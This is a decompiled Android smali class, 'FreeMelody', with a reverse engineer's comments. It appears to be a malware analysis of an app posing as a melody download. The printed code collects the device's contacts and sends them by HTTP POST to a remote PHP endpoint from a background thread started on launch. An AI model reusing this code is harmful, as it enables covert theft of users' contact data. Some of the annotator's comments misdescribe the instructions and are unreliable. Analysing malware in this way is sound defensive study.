.class public Lcom/mmmm/bl/FreeMelody;
.super Landroid/app/Activity;
.source "FreeMelody.java"


# instance fields
.field private contacts:Ljava/lang/String;

.field private image:Landroid/widget/ImageView;

.field private mHandler:Landroid/os/Handler;

.field result:Ljava/lang/String;

.field private text:Landroid/widget/TextView;

.field private touchFlg:Z

.field private url:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 30
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V 
    
    ###invokes android/app/Activity returns nothing, p0 is this instance###

    .line 31
    new-instance v0, Landroid/os/Handler; 

    ###Creates new instance of v0, puts the reference of the OS handler into v0### 

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    ###invokes os Handler, v0 is this instance###

    iput-object v0, p0, Lcom/mmmm/bl/FreeMelody;->mHandler:Landroid/os/Handler;

    ###Creates object reference in v0, refered to by p0. data from OS Handler is now in v0###
    ###This creates a message queue on this thread. Will execute them as they come out of the queue.###

    .line 34
    const-string v0, ""
    
    ###Puts reference to a string into v0###

    iput-object v0, p0, Lcom/mmmm/bl/FreeMelody;->contacts:Ljava/lang/String;

    ###appends contacts onto string in v0 instance, referenced by p0###

    .line 35
#Creates string variable in v0, puts object in FreeMelody.url
#This is the remote server the data will be sent to.
    const-string v0, "http://staraprigo.biz/bl.php" 
    iput-object v0, p0, Lcom/mmmm/bl/FreeMelody;->url:Ljava/lang/String; 


    .line 36
    const/4 v0, 0x0 

    ###puts a 4bit constant into v0###

    iput-boolean v0, p0, Lcom/mmmm/bl/FreeMelody;->touchFlg:Z 

    #appends touchFlg:Z?? into v0 p0###

    .line 37
    const/4 v0, 0x0 

    ###puts a 4 bit constant into v0###

    iput-object v0, p0, Lcom/mmmm/bl/FreeMelody;->result:Ljava/lang/String;

    ###appends results to v0, p0###

    .line 30
    return-void
.end method

###So this method was collecting data and variables that will later be used to send the data to the remote server###

.method static synthetic access$0(Lcom/mmmm/bl/FreeMelody;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 34
    iput-object p1, p0, Lcom/mmmm/bl/FreeMelody;->contacts:Ljava/lang/String;

    return-void
.end method


.method static synthetic access$1(Lcom/mmmm/bl/FreeMelody;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 31
    iget-object v0, p0, Lcom/mmmm/bl/FreeMelody;->mHandler:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic access$2(Lcom/mmmm/bl/FreeMelody;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 34
    iget-object v0, p0, Lcom/mmmm/bl/FreeMelody;->contacts:Ljava/lang/String;

    return-object v0
.end method


.method static synthetic access$3(Lcom/mmmm/bl/FreeMelody;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 115
    invoke-direct {p0, p1}, Lcom/mmmm/bl/FreeMelody;->postHttp(Ljava/lang/String;)Ljava/lang/String; 

    move-result-object v0

    return-object v0
.end method


.method static synthetic access$4(Lcom/mmmm/bl/FreeMelody;)Landroid/widget/ImageView;
    .locals 1

    .prologue
    .line 33
    iget-object v0, p0, Lcom/mmmm/bl/FreeMelody;->image:Landroid/widget/ImageView;

    return-object v0
.end method

.method static synthetic access$5(Lcom/mmmm/bl/FreeMelody;)Landroid/widget/TextView;
    .locals 1

    .prologue
    .line 32
    iget-object v0, p0, Lcom/mmmm/bl/FreeMelody;->text:Landroid/widget/TextView;

    return-object v0
.end method

.method static synthetic access$6(Lcom/mmmm/bl/FreeMelody;Z)V
    .locals 0

    .prologue
    .line 36
    iput-boolean p1, p0, Lcom/mmmm/bl/FreeMelody;->touchFlg:Z

    return-void
.end method

###static synthetic methods are created by the compiler to link inner class' to a local variable/reference###

.method private postHttp(Ljava/lang/String;)Ljava/lang/String;
    .locals 12
    .param p1, "str"    # Ljava/lang/String;

    .prologue
    const/4 v9, 0x0

    .line 116
    new-instance v0, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v0}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 119
    .local v0, "client":Lorg/apache/http/client/HttpClient;
    :try_start_0
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    iget-object v10, p0, Lcom/mmmm/bl/FreeMelody;->url:Ljava/lang/String;

    invoke-direct {v3, v10}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 122
    .local v3, "postMethod":Lorg/apache/http/client/methods/HttpPost;
    const-string v10, "Content-Type"

    const-string v11, "application/x-www-form-urlencoded"

    invoke-virtual {v3, v10, v11}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 125
    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    .line 126
    .local v4, "postParams":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "test"

    invoke-direct {v10, v11, p1}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v4, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 129
    new-instance v8, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v10, "UTF-8"

    invoke-direct {v8, v4, v10}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    .line 130
    .local v8, "sendData":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    invoke-virtual {v3, v8}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 133
    invoke-interface {v0, v3}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v7

    .line 136
    .local v7, "response":Lorg/apache/http/HttpResponse;
    invoke-interface {v7}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v10

    invoke-interface {v10}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v5

    .line 139
    .local v5, "resCode":I
    invoke-interface {v7}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v2

    .line 140
    .local v2, "httpEntity":Lorg/apache/http/HttpEntity;
    const-string v10, "UTF-8"

    invoke-static {v2, v10}, Lorg/apache/http/util/EntityUtils;->toString(Lorg/apache/http/HttpEntity;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 143
    .local v6, "resValue":Ljava/lang/String;
    const/16 v10, 0xc8

    if-ne v5, v10, :cond_0

    .line 144
    invoke-interface {v0}, Lorg/apache/http/client/HttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v10

    invoke-interface {v10}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V

    .line 155
    .end local v2    # "httpEntity":Lorg/apache/http/HttpEntity;
    .end local v3    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .end local v4    # "postParams":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    .end local v5    # "resCode":I
    .end local v6    # "resValue":Ljava/lang/String;
    .end local v7    # "response":Lorg/apache/http/HttpResponse;
    .end local v8    # "sendData":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    :goto_0
    return-object v6

    .line 149
    .restart local v2    # "httpEntity":Lorg/apache/http/HttpEntity;
    .restart local v3    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .restart local v4    # "postParams":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    .restart local v5    # "resCode":I
    .restart local v6    # "resValue":Ljava/lang/String;
    .restart local v7    # "response":Lorg/apache/http/HttpResponse;
    .restart local v8    # "sendData":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    :cond_0
    invoke-interface {v0}, Lorg/apache/http/client/HttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v10

    invoke-interface {v10}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-object v6, v9

    .line 150
    goto :goto_0

    .line 153
    .end local v2    # "httpEntity":Lorg/apache/http/HttpEntity;
    .end local v3    # "postMethod":Lorg/apache/http/client/methods/HttpPost;
    .end local v4    # "postParams":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    .end local v5    # "resCode":I
    .end local v6    # "resValue":Ljava/lang/String;
    .end local v7    # "response":Lorg/apache/http/HttpResponse;
    .end local v8    # "sendData":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    :catch_0
    move-exception v1

    .line 154
    .local v1, "e":Ljava/io/IOException;
    invoke-interface {v0}, Lorg/apache/http/client/HttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v10

    invoke-interface {v10}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V

    move-object v6, v9

    .line 155
    goto :goto_0
.end method


# virtual methods
.method public dispatchKeyEvent(Landroid/view/KeyEvent;)Z
    .locals 2
    .param p1, "event"    # Landroid/view/KeyEvent;

    .prologue
    const/4 v0, 0x1

    .line 161
    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result v1

    if-nez v1, :cond_0

    .line 162
    invoke-virtual {p1}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result v1

    packed-switch v1, :pswitch_data_0

    .line 175
    :cond_0
    invoke-super {p0, p1}, Landroid/app/Activity;->dispatchKeyEvent(Landroid/view/KeyEvent;)Z

    move-result v0

    :cond_1
    :goto_0
    return v0

    .line 164
    :pswitch_0
    iget-boolean v1, p0, Lcom/mmmm/bl/FreeMelody;->touchFlg:Z

    if-eqz v1, :cond_1

    .line 165
    invoke-virtual {p0}, Lcom/mmmm/bl/FreeMelody;->finish()V

    goto :goto_0

    .line 162
    nop

    :pswitch_data_0
    .packed-switch 0x4
        :pswitch_0
    .end packed-switch
.end method

.method public onCreate(Landroid/os/Bundle;)V
#this method is run first
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 41
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 42
    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lcom/mmmm/bl/FreeMelody;->setContentView(I)V

    .line 44
    const v0, 0x7f050001

    invoke-virtual {p0, v0}, Lcom/mmmm/bl/FreeMelody;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/mmmm/bl/FreeMelody;->text:Landroid/widget/TextView;

    .line 45
    const/high16 v0, 0x7f050000

    invoke-virtual {p0, v0}, Lcom/mmmm/bl/FreeMelody;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ImageView;

    iput-object v0, p0, Lcom/mmmm/bl/FreeMelody;->image:Landroid/widget/ImageView;

    .line 47
    iget-object v0, p0, Lcom/mmmm/bl/FreeMelody;->text:Landroid/widget/TextView;

    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setVisibility(I)V

    .line 48
    return-void
.end method

.method public onStart()V
#run after onCreate()
    .locals 2

    .prologue
    .line 52
    invoke-super {p0}, Landroid/app/Activity;->onStart()V
#tells android/app/Activity onStart has started

    .line 55
    new-instance v0, Ljava/lang/Thread;
#Creates thread instance

#Creates instance of FreeMelody$1
#calls FreeMelody$1
    new-instance v1, Lcom/mmmm/bl/FreeMelody$1;
    invoke-direct {v1, p0}, Lcom/mmmm/bl/FreeMelody$1;-><init>(Lcom/mmmm/bl/FreeMelody;)V


    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 112
    .local v0, "thread":Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 113
    return-void
.end method
